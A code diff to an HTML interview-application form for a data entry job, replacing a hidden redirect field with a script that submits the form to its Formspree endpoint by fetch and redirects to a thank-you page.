@@ -387,9 +387,8 @@
           </ul>
         </div>
 
-        <form action="https://formspree.io/f/mgopeaaq" method="POST">
+        <form id="interviewForm" action="https://formspree.io/f/mgopeaaq" method="POST">
           <input type="hidden" name="_subject" value="New Data Entry Specialist Interview Submission" />
-          <input type="hidden" name="_next" value="https://dataentryspecialistinterviewform.cv/thank-you.html" />
 
           <h2 class="section-title">Personal Information</h2>
 
@@ -519,7 +518,7 @@
           </div>
 
           <div class="actions">
-            <button type="submit" class="btn-primary">Submit Interview Form</button>
+            <button type="submit" class="btn-primary" id="submitButton">Submit Interview Form</button>
             <button type="reset" class="btn-secondary">Reset Form</button>
           </div>
 
@@ -530,5 +529,44 @@
       </div>
     </div>
   </div>
+
+  <script>
+    const form = document.getElementById("interviewForm");
+    const submitButton = document.getElementById("submitButton");
+
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      submitButton.disabled = true;
+      submitButton.textContent = "Submitting...";
+
+      try {
+        const response = await fetch(form.action, {
+          method: "POST",
+          body: new FormData(form),
+          headers: {
+            "Accept": "application/json"
+          }
+        });
+
+        if (response.ok) {
+          window.location.href = "https://dataentryspecialistinterviewform.cv/thank-you.html";
+        } else {
+          alert("There was a problem submitting the form. Please try again.");
+          submitButton.disabled = false;
+          submitButton.textContent = "Submit Interview Form";
+        }
+      } catch (error) {
+        alert("There was a network error. Please try again.");
+        submitButton.disabled = false;
+        submitButton.textContent = "Submit Interview Form";
+      }
+    });
+  </script>
 </body>
 </html>
